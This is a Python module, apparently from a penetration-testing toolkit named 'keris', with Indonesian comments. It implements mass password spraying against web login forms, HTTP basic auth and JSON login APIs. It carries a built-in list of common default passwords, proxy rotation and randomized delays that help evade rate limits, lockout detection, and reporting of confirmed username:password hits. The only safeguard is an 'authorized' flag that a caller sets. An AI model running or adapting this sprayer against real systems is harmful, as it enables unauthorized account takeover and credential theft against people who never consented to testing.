"""Mass password spraying: uji kebijakan akun dengan pola bertanggung jawab.

Melakukan password spraying (banyak username, SATU password) terhadap
form login / basic auth / API JSON. Fitur keamanan bawaan:

- anti-lockout: hanya 1 percobaan per akun per password; delay acak antar
  percobaan; berhenti otomatis bila respons mulai tampak lockout/rate-limit
- tanpa proxy: throttle bawaan; opsional proxy rotation via list
- hasil hanya sukses yang terkonfirmasi (status/body explicit)

GUARD: memerlukan `authorized=True`; tanpa itu modul menolak beroperasi.
"""

import json
import random
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin

from keris.core.http import KerisHTTP
from keris.core.logger import debug, info, ok, warn
from keris.modules.scanner import Finding

SUCCESS_MARKERS = ["welcome", "dashboard", "logout", "logged in", "account",
                   "profile", "session=", "auth", "berhasil", "selamat"]
FAIL_MARKERS = ["invalid", "wrong", "failed", "incorrect", "tidak valid",
                "salah", "not found", "forbidden", "unauthorized", "error"]
LOCKOUT_MARKERS = ["lock", "too many", "rate limit", "try again later",
                   "akun diblokir", "terlalu banyak", "tunggu"]

DEFAULT_PASSWORDS = [
    "admin", "password", "123456", "admin123", "Password1", "P@ssw0rd",
    "Welcome1", "qwerty", "letmein", "12345678", "root", "test123",
]


def _find_login_form(client: KerisHTTP, base: str) -> Optional[str]:
    """Cari form login di halaman utama; return action URL."""
    try:
        r = client.get(base, timeout=15)
    except Exception:
        return None
    import re
    m = re.search(r"<form[^>]*action=['\"]([^'\"]+)['\"]", (r.text or ""), re.I)
    if not m:
        return None
    return urljoin(base.rstrip("/") + "/", m.group(1))


def _looks_success(body: str) -> Tuple[bool, str]:
    low = (body or "").lower()
    for m in LOCKOUT_MARKERS:
        if m in low:
            return False, f"lockout/rate-limit terdeteksi ({m})"
    for m in FAIL_MARKERS:
        if m in low:
            return False, ""
    for m in SUCCESS_MARKERS:
        if m in low:
            return True, m
    return False, ""


def _try_form(client: KerisHTTP, action: str, user: str, password: str) -> Tuple[int, str]:
    try:
        r = client.post(action, data={"username": user, "password": password,
                                      "login": "1", "submit": "Login"}, timeout=15)
        return r.status_code, r.text or ""
    except Exception as e:
        return 0, str(e)


def _try_basic(client: KerisHTTP, base: str, user: str, password: str) -> Tuple[int, str]:
    try:
        c2 = KerisHTTP(basic_auth=(user, password), proxy=client.proxy,
                       timeout=client.timeout, insecure=client.insecure)
        r = c2.get(base, timeout=15)
        c2.close()
        return r.status_code, r.text or ""
    except Exception as e:
        return 0, str(e)


def _try_json(client: KerisHTTP, ep: str, user: str, password: str) -> Tuple[int, str]:
    try:
        r = client.post(ep, json={"username": user, "password": password}, timeout=15)
        return r.status_code, r.text or ""
    except Exception as e:
        return 0, str(e)


def spray(base: str, client: KerisHTTP,
          usernames: List[str],
          passwords: Optional[List[str]] = None,
          auth_type: str = "auto",
          delay: float = 0.5,
          proxies: Optional[List[str]] = None,
          authorized: bool = False) -> List[Finding]:
    """Password spraying satu-password-per-akun.

    `auth_type`: auto (deteksi form/basic/json), form, basic, json.
    """
    if not authorized:
        warn("Password spray memerlukan --authorized.")
        return []
    passwords = passwords or DEFAULT_PASSWORDS
    usernames = list(dict.fromkeys(u.strip() for u in usernames if u.strip()))
    if not usernames:
        return []
    info(f"Password spray: {len(usernames)} akun x {len(passwords)} password "
         f"(1 percobaan per akun per password, delay {delay}s)")

    # resolusi tipe auth sekali di awal
    form_action = _find_login_form(client, base) if auth_type in ("auto", "form") else None
    if auth_type in ("auto", "form") and not form_action:
        debug("Tidak ada form ditemukan; fallback basic auth")
        auth_type = "basic"

    findings: List[Finding] = []
    tried = 0
    locked = False
    proxy_pool = list(proxies or [])
    pi = 0

    for password in passwords:
        if locked:
            warn("Lockout/rate-limit terdeteksi; spray dihentikan.")
            break
        for user in usernames:
            # rotasi proxy bila disediakan
            active = client
            if proxy_pool:
                try:
                    active = KerisHTTP(proxy=proxy_pool[pi % len(proxy_pool)],
                                       timeout=client.timeout,
                                       insecure=client.insecure)
                    pi += 1
                except Exception:
                    active = client
            try:
                if auth_type in ("auto", "form") and form_action:
                    code, body = _try_form(active, form_action, user, password)
                elif auth_type == "json":
                    code, body = _try_json(active, base.rstrip("/") + "/api/login", user, password)
                else:
                    code, body = _try_basic(active, base, user, password)
            finally:
                if active is not client:
                    active.close()

            tried += 1
            low = body.lower()
            if any(m in low for m in LOCKOUT_MARKERS):
                locked = True
                break
            ok_b, marker = _looks_success(body)
            if ok_b and code in (200, 201, 202, 203, 204):
                findings.append(Finding(
                    "CRITICAL", "Kredensial lemah terkonfirmasi (spray)",
                    base,
                    f"`{user}:{password}` berhasil login "
                    f"({auth_type}; marker `{marker}`).",
                    f"user={user}\npassword={password}",
                    cwe="CWE-521",
                    references="https://owasp.org/www-community/attacks/Password_Spraying_Attack",
                ))
                ok(f"  SPRAY HIT: {user}:{password}")
                # satu password per akun -> lanjut akun berikutnya
            else:
                debug(f"  {user}:{password} -> {code}")
            if delay > 0:
                time.sleep(delay + random.uniform(0, delay * 0.5))
        if locked:
            break

    ok(f"Spray selesai: {tried} percobaan, {len(findings)} kredensial valid")
    return findings
